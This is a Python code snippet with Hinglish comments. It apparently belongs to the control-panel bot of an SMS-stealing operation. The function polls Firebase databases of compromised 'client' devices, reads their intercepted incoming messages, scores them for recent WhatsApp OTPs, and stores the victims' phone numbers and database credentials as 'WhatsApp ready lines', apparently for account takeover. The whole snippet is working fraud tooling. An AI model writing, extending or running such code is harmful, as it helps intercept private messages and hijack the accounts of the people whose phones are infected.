# ... (Tere scanner.py me jo purana code hai wo same rahega, bas ye naya function neeche add kar de)

# 🚨 NAYA: WhatsApp Ready Lines Scanner (Har 60 sec me DB update karega)
async def whatsapp_scanner(bot):
    log.info("WhatsApp Background Scanner Started...")
    while True:
        try:
            d = db.load_data()
            fbs = d.get("firebases", [])
            ready_lines = {} # Temporary dict to hold new data
            
            now = time.time()
            
            # Chunking to prevent Firebase Timeout
            for i in range(0, len(fbs), 5):
                chunk = fbs[i:i+5]
                for fb in chunk:
                    clients = await fbu.fetch_fb(f"{fb['url']}/clients.json", fb.get("auth"))
                    if not clients or not isinstance(clients, dict): continue
                    
                    for dev_id, c in clients.items():
                        if not isinstance(c, dict): continue
                        is_online = c.get("status") is True or (c.get("ping", {}).get("ts", 0) > (now - 1800) * 1000)
                        
                        if is_online:
                            # Fetch last 10 messages only to check WhatsApp recency
                            msgs_dict = await fbu.fetch_fb(f"{fb['url']}/messages/{dev_id}.json?orderBy=%22%24key%22&limitToLast=10", fb.get("auth"))
                            if not msgs_dict: continue
                            
                            msgs = [v for v in msgs_dict.values() if isinstance(v, dict) and v.get("type") == "incoming"]
                            
                            ws_chance = fbu.get_ws_chance(msgs) 
                            # Agar chance 90% se zyada hai (matlab recent WhatsApp OTP aaya hai)
                            if ws_chance >= 90:
                                best_nums = fbu.extract_best_numbers(c, msgs)
                                if best_nums:
                                    num = best_nums[0][0]
                                    health = fbu.calculate_health(msgs)
                                    
                                    # Latest timestamp nikalne ke liye
                                    latest_id = int(msgs[0].get("id", 0)) if msgs else 0
                                    
                                    ready_lines[dev_id] = {
                                        "fb_url": fb['url'],
                                        "auth": fb.get("auth", ""),
                                        "number": num,
                                        "chance": ws_chance,
                                        "health": health,
                                        "time": int(now),
                                        "sort_id": latest_id
                                    }
            
            # Save to Database
            d = db.load_data()
            d["whatsapp_ready_lines"] = ready_lines
            db.save_data(d)
            log.info(f"Updated {len(ready_lines)} WhatsApp ready lines in DB.")
            
        except Exception as e:
            log.error(f"WA Scanner error: {e}")
            
        await asyncio.sleep(60) # Har 1 minute me update hoga
